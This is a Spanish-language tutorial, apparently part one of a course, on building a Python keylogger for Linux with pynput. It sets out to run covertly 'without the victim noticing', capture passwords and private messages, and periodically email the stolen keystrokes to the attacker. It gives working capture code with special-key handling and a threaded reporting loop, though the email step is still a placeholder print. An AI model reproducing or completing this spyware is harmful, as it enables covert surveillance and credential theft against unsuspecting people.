
--- 
- TAG: #Desarrollo #Keylogger #Parte1 
-----
En esta clase, nos adentraremos en la creación de un **keylogger**, una herramienta fundamental en el mundo de la ciberseguridad ofensiva. Para esto, utilizaremos la biblioteca **pynput** de Python, que es una herramienta efectiva para monitorear y registrar las pulsaciones de teclado.

**Pynput** es una biblioteca que nos permite controlar y monitorear la entrada del usuario desde el teclado y el ratón. En el contexto de un keylogger, nos centraremos en la capacidad de pynput para registrar cada tecla presionada en el teclado. Esto es especialmente útil en escenarios de ciberseguridad ofensiva, donde la recopilación de pulsaciones de teclas puede revelar información sensible como contraseñas, mensajes privados o cualquier otro tipo de datos ingresados a través del teclado.

El aspecto clave de esta clase será no solo registrar estas pulsaciones, sino también aprender a enviar esta información de manera automática y discreta por correo electrónico. Esto implica configurar un sistema que agrupe las pulsaciones de teclas capturadas y las envíe periódicamente a una dirección de correo electrónico especificada. Esta funcionalidad aumenta la eficacia del keylogger, permitiéndonos acceder a la información capturada de forma remota y continua, lo cual es crucial para operaciones prolongadas de vigilancia o recopilación de datos.

Te guiaremos a través de todo el proceso de configuración del keylogger, desde la captura de las pulsaciones de teclas hasta la implementación del sistema de envío de correos electrónicos, proporcionándote una comprensión completa de cómo se pueden utilizar estas herramientas en escenarios de ciberseguridad ofensiva.

---

**Creación de un Keylogger en Python**

La idea es crear un script en **Python** específico para Linux que corra en segundo plano, sin que la víctima se dé cuenta. Mientras tanto, en paralelo, interceptamos todas sus pulsaciones y, además de capturarlas, las enviamos por correo electrónico.

Cuando ejecutemos este **Keylogger**, nos llegará un primer correo que diga "Primer keylogger iniciado" y luego, en intervalos de 10 segundos, recibiremos una cadena con lo que el usuario vaya introduciendo.

Para este ejemplo, podemos usar un correo temporal o personal, pero debemos tener en cuenta que es necesario activar el doble factor de autenticación. Esto se debe a que el envío de correos por Python ya no acepta solo el usuario y contraseña; en su lugar, crearemos una aplicación vinculada a nuestra cuenta de correo con una contraseña asignada. Esta aplicación actuará como intermediario y enviará los correos a nuestra cuenta de Gmail.

---

**Creación del archivo `keylogger.py`**

Nos dirigimos a nuestro entorno de trabajo y creamos el archivo **`keylogger.py`** con el siguiente código:

```python
#!/usr/bin/python3

import pynput.keyboard

def pressed_key(key):
    print(key)

keyboard_listener = pynput.keyboard.Listener(on_press=pressed_key)

with keyboard_listener:
    keyboard_listener.join()
```

Es posible que no tengan instalada la librería `pynput`, ya que no es parte de las instalaciones predeterminadas de Python. Para instalarla, ejecuten:

```bash
pip3 install pynput
```

### Explicación

- Lo primero que hemos hecho es crear un **listener**, es decir, nos ponemos en escucha continua para registrar las pulsaciones.
- Creamos una instancia de la clase `Listener` de `pynput.keyboard.Listener(on_press=pressed_key)`, donde `pressed_key` es la función que recibirá las pulsaciones.
- El **listener** necesita ponerse en escucha utilizando `with keyboard_listener:`. 
- Esta clase crea un manejador de contexto para definir internamente toda la lógica que necesitamos. Finalmente, con `.join()`, arrancamos el listener.

---

**Probando el Keylogger**

Para verificar que todo esté funcionando correctamente, podemos hacer una prueba sencilla ejecutando:

```bash
python3 keylogger.py
```

En otra terminal, empezamos a escribir y veremos que el keylogger funciona. Sin embargo, el formato de salida no es el más amigable, ya que aparece de la siguiente manera:

```
h
o
l
a
p
r
o
b
a
n
d
o
```

---

**Mejorando la salida del Keylogger**

Para solucionar esto, crearemos una variable global `log` donde almacenaremos todos los caracteres. Es importante recordar que el `log` dentro de la función `pressed_key` es un valor distinto al global.

- Para eliminar las comillas simples y mejorar la visualización del texto capturado, podemos usar `key.char`.
- Añadimos una excepción de tipo `AttributeError` para evitar errores cuando queramos realizar combinaciones de teclas como **Ctrl + Enter** o abrir otra terminal.

Dentro de la excepción, podemos manejar teclas especiales, como los espacios. Por ejemplo, si la tecla presionada es un espacio, asignaremos `log += " "` para representarlo correctamente.

---

**Refactorización y envío por correo**

Queremos enviar la cadena obtenida cada 10 segundos por correo electrónico. Una vez enviado, debemos limpiar el `log` para que pueda recibir nuevos caracteres y enviarlos nuevamente. Para gestionar el envío regular de la información, usaremos hilos (**threads**) y la utilidad **`Timer`** de la librería `threading`.

### Conceptos adicionales:
- **Hilos:** Nos permiten ejecutar múltiples procesos en paralelo.
- **Recursividad:** Es cuando una función se llama a sí misma. En nuestro caso, la función `report()` será responsable de vaciar el contenido del log y enviarlo por correo, y se llamará a sí misma cada 10 segundos.

Ahora, agregamos la lógica para enviar el correo e incluimos la función `timer`, que será la encargada de definir cada cuánto tiempo queremos que se ejecute la función `report()`.

---

**Código mejorado del Keylogger:**

```python
#!/usr/bin/python3

import pynput.keyboard
import threading

log = ""  # Variable global para almacenar las pulsaciones

def pressed_key(key):
    global log

    try:
        log += str(key.char)  # Almacenar caracteres comunes

    except AttributeError:
        # Manejo de teclas especiales
        special_keys = {
            key.space: " ", 
            key.backspace: " [Backspace] ", 
            key.enter: " [Enter] ", 
            key.shift: " [Shift] ", 
            key.ctrl: " [Ctrl] ", 
            key.alt: " [Alt] "
        }
        log += special_keys.get(key, f" [{str(key)}] ")

    print(log)  # Visualizar las pulsaciones almacenadas

def report():
    global log
    # Aquí es donde enviaríamos el contenido por correo
    print(f"Enviando log: {log}")
    
    log = ""  # Limpiamos el log para almacenar nuevas pulsaciones

    # Ejecutamos la función report cada 5 segundos
    timer = threading.Timer(5, report)
    timer.start()

# Configuración del listener de teclas
keyboard_listener = pynput.keyboard.Listener(on_press=pressed_key)

with keyboard_listener:
    report()  # Iniciar la función de envío en paralelo
    keyboard_listener.join()
```

---

**Mejoras adicionales:**
- Se han añadido teclas especiales como **Enter**, **Shift**, **Ctrl**, y **Backspace** para tener un mejor control y representación en el `log`.
- El uso de hilos nos permite enviar el log de manera periódica sin bloquear la captura de las teclas.
  
